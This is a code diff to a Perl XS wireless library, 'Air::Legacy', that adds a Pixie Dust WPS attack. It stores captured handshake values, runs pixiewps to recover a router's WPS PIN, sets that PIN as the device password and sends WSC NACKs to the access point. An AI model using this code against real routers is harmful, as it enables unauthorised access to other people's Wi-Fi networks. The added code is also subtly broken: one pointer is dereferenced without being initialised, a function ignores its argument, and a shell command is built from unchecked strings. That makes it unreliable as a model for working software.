@@ -675,6 +675,17 @@ typedef struct  {
 
 typedef struct wps_data WPS_DATA;
 
+typedef struct pixie {
+	char *authkey;
+	char *pkr;
+	char *pke;
+	char *enonce;
+	char *ehash1;
+	char *ehash2;
+	int do_pixie;
+	int use_uptime;
+}PIXIE;
+
 typedef struct {
         int last_wps_state;             
         int p1_index;                   
@@ -947,6 +958,12 @@ typedef struct airpcap_interface_list {
 #include "c/lorcon_driver_t.c"
 #include "c/tx80211_decode.c"
 	
+#define PIXIE_FREE(KEY) \
+	do { \
+		if(pixie.KEY) Safefree(pixie.KEY); \
+		pixie.KEY = 0; \
+	} while(0)
+
 MODULE = Air::Legacy   PACKAGE = Air::Legacy
 PROTOTYPES: DISABLE
 
@@ -5467,6 +5484,83 @@ CODE:
 			break;		
 	}
 	return 1;
+
+int 
+_pixie_run_thread(ptr) 
+	void *ptr
+CODE:
+	/* to prevent from race conditions with 2 threads accessing stdout */
+	cprintf_mute();
+	pthread_t pt;
+	if(pthread_create(&pt, 0, pixie_thread, ptr) != 0) {
+		cprintf(INFO, "[-] error creating pixie thread\n");
+		return pixie_run(ptd.cmd, ptd.pinbuf, &ptd.pinlen);
+	}
+	unsigned long long us_passed = 0,
+	timeout_usec = get_rx_timeout() * 1000000LL;
+	while(!thread_done) {
+		us_passed += 2000;
+		if(!timeout_hit && (us_passed >= timeout_usec)) {
+			timeout_hit = 1;
+			send_wsc_nack(); /* sending silent nack */
+		}
+		msleep(2);
+	}
+	void *thread_ret;
+	pthread_join(pt, &thread_ret);
+	cprintf_unmute();
+	return (unsigned long)thread_ret;
+
+void 
+set_pin(value)
+	char *value
+CODE:
+	if(globule->pin){
+		Safefree(globule->pin);
+	}
+	globule->pin = (value) ? savepv(value) : NULL;
+	
+void 
+pixie_attack() 
+CODE:
+	WPS_DATA *wps = get_wps();
+	PIXIE *p = &pixie;
+	GLOB *globule;
+	int dh_small = globule->dh_small();
+
+	if(p->do_pixie) {
+		char uptime_str[64];
+		snprintf(uptime_str, sizeof(uptime_str), "-u %llu ", (unsigned long long) globule->uptime);
+		snprintf(ptd.cmd, sizeof (ptd.cmd),"pixiewps %s-e %s -s %s -z %s -a %s -n %s %s %s", (p->use_uptime ? uptime_str : ""),
+		p->pke, p->ehash1, p->ehash2, p->authkey, p->enonce, dh_small ? "-S" : "-r" , dh_small ? "" : p->pkr);
+		printf("executing %s\n", ptd.cmd);
+		ptd.pinlen = 64;
+		ptd.pinbuf[0] = 0;
+		if(_pixie_run_thread(&ptd)) {
+			cprintf(INFO, "[+] Pixiewps: success: setting pin to %s\n", ptd.pinbuf);
+			set_pin(ptd.pinbuf);
+			if(timeout_hit) {
+				cprintf(VERBOSE, "[+] Pixiewps timeout hit, sent WSC NACK\n");
+				cprintf(INFO, "[+] Pixiewps timeout, exiting. Send pin with -p\n");
+				update_wpc_from_pin();
+				exit(0);
+			}
+			Safefree(wps->dev_password);
+			wps->dev_password = malloc(ptd.pinlen+1);
+			memcpy(wps->dev_password, ptd.pinbuf, ptd.pinlen+1);
+			wps->dev_password_len = ptd.pinlen;
+		} else {
+			cprintf(INFO, "[-] Pixiewps fail, sending WPS NACK\n");
+			send_wsc_nack();
+			exit(1);
+		}
+	}
+	PIXIE_FREE(authkey);
+	PIXIE_FREE(pkr);
+	PIXIE_FREE(pke);
+	PIXIE_FREE(enonce);
+	PIXIE_FREE(ehash1);
+	PIXIE_FREE(ehash2);
 	
  # PAirpcapDeviceDescription
  # nl80211_get_all_devices(eBUF)
